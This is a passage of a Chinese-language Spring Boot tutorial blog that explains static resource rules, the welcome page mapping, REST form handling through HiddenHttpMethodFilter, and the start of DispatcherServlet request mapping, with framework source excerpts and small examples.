class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfiguration</span> &#123;<br>    ...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EnableWebMvcConfiguration</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DelegatingWebMvcConfiguration</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ResourceLoaderAware</span> &#123;<br>        ...<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addResourceHandlers</span><span class="hljs-params">(ResourceHandlerRegistry registry)</span> &#123;<br><span class="hljs-built_in">super</span>.addResourceHandlers(registry);<br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.resourceProperties.isAddMappings()) &#123;<br>logger.debug(<span class="hljs-string">&quot;Default resource handling disabled&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> getServletContext();<br>addResourceHandler(registry, <span class="hljs-string">&quot;/webjars/**&quot;</span>, <span class="hljs-string">&quot;classpath:/META-INF/resources/webjars/&quot;</span>);<br>addResourceHandler(registry, <span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern(), (registration) -&gt; &#123;<br>registration.addResourceLocations(<span class="hljs-built_in">this</span>.resourceProperties.getStaticLocations());<br><span class="hljs-keyword">if</span> (servletContext != <span class="hljs-literal">null</span>) &#123;<br>registration.addResourceLocations(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletContextResource</span>(servletContext, SERVLET_LOCATION));<br>&#125;<br>&#125;);<br>&#125;<br>        ...<br>        <br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>根据上述代码，我们可以同过配置禁止所有静态资源规则。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">resources:</span><br>    <span class="hljs-attr">add-mappings:</span> <span class="hljs-literal">false</span>   <span class="hljs-comment">#禁用所有静态资源规则</span><br></code></pre></td></tr></table></figure><p>静态资源规则：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.resources&quot;, ignoreUnknownFields = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceProperties</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String[] CLASSPATH_RESOURCE_LOCATIONS = &#123; <span class="hljs-string">&quot;classpath:/META-INF/resources/&quot;</span>,<br>            <span class="hljs-string">&quot;classpath:/resources/&quot;</span>, <span class="hljs-string">&quot;classpath:/static/&quot;</span>, <span class="hljs-string">&quot;classpath:/public/&quot;</span> &#125;;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Locations of static resources. Defaults to classpath:[/META-INF/resources/,</span><br><span class="hljs-comment">     * /resources/, /static/, /public/].</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">private</span> String[] staticLocations = CLASSPATH_RESOURCE_LOCATIONS;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="欢迎页的处理规则"><a href="#欢迎页的处理规则" class="headerlink" title="欢迎页的处理规则"></a>欢迎页的处理规则</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfiguration</span> &#123;<br>    ...<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EnableWebMvcConfiguration</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DelegatingWebMvcConfiguration</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ResourceLoaderAware</span> &#123;<br>        ...<br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> WelcomePageHandlerMapping <span class="hljs-title function_">welcomePageHandlerMapping</span><span class="hljs-params">(ApplicationContext applicationContext,</span><br><span class="hljs-params">FormattingConversionService mvcConversionService, ResourceUrlProvider mvcResourceUrlProvider)</span> &#123;<br><span class="hljs-type">WelcomePageHandlerMapping</span> <span class="hljs-variable">welcomePageHandlerMapping</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WelcomePageHandlerMapping</span>(<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateAvailabilityProviders</span>(applicationContext), applicationContext, getWelcomePage(),<br><span class="hljs-built_in">this</span>.mvcProperties.getStaticPathPattern());<br>welcomePageHandlerMapping.setInterceptors(getInterceptors(mvcConversionService, mvcResourceUrlProvider));<br>welcomePageHandlerMapping.setCorsConfigurations(getCorsConfigurations());<br><span class="hljs-keyword">return</span> welcomePageHandlerMapping;<br>&#125;<br>    <br></code></pre></td></tr></table></figure><p><code>WelcomePageHandlerMapping</code>的构造方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">WelcomePageHandlerMapping(TemplateAvailabilityProviders templateAvailabilityProviders,<br>                          ApplicationContext applicationContext, Resource welcomePage, String staticPathPattern) &#123;<br>    <span class="hljs-keyword">if</span> (welcomePage != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-string">&quot;/**&quot;</span>.equals(staticPathPattern)) &#123;<br>        <span class="hljs-comment">//要用欢迎页功能，必须是/**</span><br>        logger.info(<span class="hljs-string">&quot;Adding welcome page: &quot;</span> + welcomePage);<br>        setRootViewName(<span class="hljs-string">&quot;forward:index.html&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (welcomeTemplateExists(templateAvailabilityProviders, applicationContext)) &#123;<br>        <span class="hljs-comment">//调用Controller /index</span><br>        logger.info(<span class="hljs-string">&quot;Adding welcome page template: index&quot;</span>);<br>        setRootViewName(<span class="hljs-string">&quot;index&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这构造方法内的代码也解释了<a href="#">web场景-welcome与favicon功能</a>中配置<code>static-path-pattern</code>了，welcome页面和小图标失效的问题。</p><h2 id="26、请求处理-【源码分析】-Rest映射及源码解析"><a href="#26、请求处理-【源码分析】-Rest映射及源码解析" class="headerlink" title="26、请求处理-【源码分析】-Rest映射及源码解析"></a>26、请求处理-【源码分析】-Rest映射及源码解析</h2><h3 id="请求映射"><a href="#请求映射" class="headerlink" title="请求映射"></a>请求映射</h3><ul><li><p>@xxxMapping;</p><ul><li>@GetMapping</li><li>@PostMapping</li><li>@PutMapping</li><li>@DeleteMapping</li></ul></li><li><p>Rest风格支持（使用<strong>HTTP</strong>请求方式动词来表示对资源的操作）</p><ul><li>以前：<ul><li>&#x2F;getUser 获取用户</li><li>&#x2F;deleteUser 删除用户</li><li>&#x2F;editUser 修改用户</li><li>&#x2F;saveUser保存用户</li></ul></li><li>现在： &#x2F;user <ul><li>GET-获取用户</li><li>DELETE-删除用户</li><li>PUT-修改用户</li><li>POST-保存用户</li></ul></li><li>核心Filter；HiddenHttpMethodFilter</li></ul></li><li><p><strong>用法</strong></p><ul><li>开启页面表单的Rest功能</li><li>页面 form的属性method&#x3D;post，隐藏域 _method&#x3D;put、delete等（如果直接get或post，无需隐藏域）</li><li>编写请求映射</li></ul></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">mvc:</span><br>    <span class="hljs-attr">hiddenmethod:</span><br>      <span class="hljs-attr">filter:</span><br>        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>   <span class="hljs-comment">#开启页面表单的Rest功能</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-GET提交&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-POST提交&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;_method&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DELETE&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-DELETE 提交&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;_method&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;PUT&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-PUT提交&quot;</span><span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/user&quot;)</span><br><span class="hljs-comment">//@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.GET)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUser</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;GET-张三&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@PostMapping(&quot;/user&quot;)</span><br><span class="hljs-comment">//@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">saveUser</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;POST-张三&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@PutMapping(&quot;/user&quot;)</span><br><span class="hljs-comment">//@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.PUT)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">putUser</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;PUT-张三&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">@DeleteMapping(&quot;/user&quot;)</span><br><span class="hljs-comment">//@RequestMapping(value = &quot;/user&quot;,method = RequestMethod.DELETE)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">deleteUser</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DELETE-张三&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Rest原理（表单提交要使用REST的时候）<ul><li>表单提交会带上<code>\_method=PUT</code></li><li><strong>请求过来被</strong><code>HiddenHttpMethodFilter</code>拦截<ul><li>请求是否正常，并且是POST<ul><li>获取到<code>\_method</code>的值。</li><li>兼容以下请求；<strong>PUT</strong>.<strong>DELETE</strong>.<strong>PATCH</strong></li><li><strong>原生request（post），包装模式requesWrapper重写了getMethod方法，返回的是传入的值。</strong></li><li><strong>过滤器链放行的时候用wrapper。以后的方法调用getMethod是调用requesWrapper的。</strong></li></ul></li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HiddenHttpMethodFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">OncePerRequestFilter</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; ALLOWED_METHODS =<br>Collections.unmodifiableList(Arrays.asList(HttpMethod.PUT.name(),<br>HttpMethod.DELETE.name(), HttpMethod.PATCH.name()));<br><br><span class="hljs-comment">/** Default method parameter: &#123;<span class="hljs-doctag">@code</span> _method&#125;. */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_METHOD_PARAM</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;_method&quot;</span>;<br><br><span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">methodParam</span> <span class="hljs-operator">=</span> DEFAULT_METHOD_PARAM;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Set the parameter name to look for HTTP methods.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@see</span> #DEFAULT_METHOD_PARAM</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMethodParam</span><span class="hljs-params">(String methodParam)</span> &#123;<br>Assert.hasText(methodParam, <span class="hljs-string">&quot;&#x27;methodParam&#x27; must not be empty&quot;</span>);<br><span class="hljs-built_in">this</span>.methodParam = methodParam;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilterInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)</span><br><span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br><br><span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">requestToUse</span> <span class="hljs-operator">=</span> request;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;POST&quot;</span>.equals(request.getMethod()) &amp;&amp; request.getAttribute(WebUtils.ERROR_EXCEPTION_ATTRIBUTE) == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">paramValue</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-built_in">this</span>.methodParam);<br><span class="hljs-keyword">if</span> (StringUtils.hasLength(paramValue)) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> paramValue.toUpperCase(Locale.ENGLISH);<br><span class="hljs-keyword">if</span> (ALLOWED_METHODS.contains(method)) &#123;<br>requestToUse = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpMethodRequestWrapper</span>(request, method);<br>&#125;<br>&#125;<br>&#125;<br><br>filterChain.doFilter(requestToUse, response);<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Simple &#123;<span class="hljs-doctag">@link</span> HttpServletRequest&#125; wrapper that returns the supplied method for</span><br><span class="hljs-comment"> * &#123;<span class="hljs-doctag">@link</span> HttpServletRequest#getMethod()&#125;.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpMethodRequestWrapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServletRequestWrapper</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpMethodRequestWrapper</span><span class="hljs-params">(HttpServletRequest request, String method)</span> &#123;<br><span class="hljs-built_in">super</span>(request);<br><span class="hljs-built_in">this</span>.method = method;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMethod</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.method;<br>&#125;<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Rest使用客户端工具。<ul><li>如PostMan可直接发送put、delete等方式请求。</li></ul></li></ul><h2 id="27、请求处理-【源码分析】-怎么改变默认的-method"><a href="#27、请求处理-【源码分析】-怎么改变默认的-method" class="headerlink" title="27、请求处理-【源码分析】-怎么改变默认的_method"></a>27、请求处理-【源码分析】-怎么改变默认的_method</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class, WebMvcConfigurer.class &#125;)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</span><br><span class="hljs-meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)</span><br><span class="hljs-meta">@AutoConfigureAfter(&#123; DispatcherServletAutoConfiguration.class, TaskExecutionAutoConfiguration.class,</span><br><span class="hljs-meta">ValidationAutoConfiguration.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfiguration</span> &#123;<br><br>    ...<br>    <br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-meta">@ConditionalOnMissingBean(HiddenHttpMethodFilter.class)</span><br>    <span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;spring.mvc.hiddenmethod.filter&quot;, name = &quot;enabled&quot;, matchIfMissing = false)</span><br>    <span class="hljs-keyword">public</span> OrderedHiddenHttpMethodFilter <span class="hljs-title function_">hiddenHttpMethodFilter</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderedHiddenHttpMethodFilter</span>();<br>    &#125;<br>    <br>    ...<br>&#125;<br>    <br></code></pre></td></tr></table></figure><p><code>@ConditionalOnMissingBean(HiddenHttpMethodFilter.class)</code>意味着在没有<code>HiddenHttpMethodFilter</code>时，才执行<code>hiddenHttpMethodFilter()</code>。因此，我们可以自定义filter，改变默认的<code>\_method</code>。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span>&#123;<br>    <span class="hljs-comment">//自定义filter</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> HiddenHttpMethodFilter <span class="hljs-title function_">hiddenHttpMethodFilter</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">HiddenHttpMethodFilter</span> <span class="hljs-variable">methodFilter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HiddenHttpMethodFilter</span>();<br>        methodFilter.setMethodParam(<span class="hljs-string">&quot;_m&quot;</span>);<br>        <span class="hljs-keyword">return</span> methodFilter;<br>    &#125;    <br>&#125;<br></code></pre></td></tr></table></figure><p>将<code>\_method</code>改成<code>_m</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/user&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;_m&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;DELETE&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;REST-DELETE 提交&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="28、请求处理-【源码分析】-请求映射原理"><a href="#28、请求处理-【源码分析】-请求映射原理" class="headerlink" title="28、请求处理-【源码分析】-请求映射原理"></a>28、请求处理-【源码分析】-请求映射原理</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20210205005703527.png" alt="在这里插入图片描述"><br>SpringMVC功能分析都从 <code>org.springframework.web.servlet.DispatcherServlet</code> -&gt; <code>doDispatch()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            processedRequest = checkMultipart(request);<br>            multipartRequestParsed = (processedRequest != request);<br><br>            <span class="hljs-comment">// 找到当前请求使用哪个Handler（Controller的方法）处理</span><br>            mappedHandler = getHandler(processedRequest);<br><br>            <span class="hljs-comment">//HandlerMapping：处理器映射。/xxx-&gt;&gt;xxxx</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p><code>getHandler()</code>方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Nullable</span><br><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">for</span> (HandlerMapping mapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;<br>            <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> 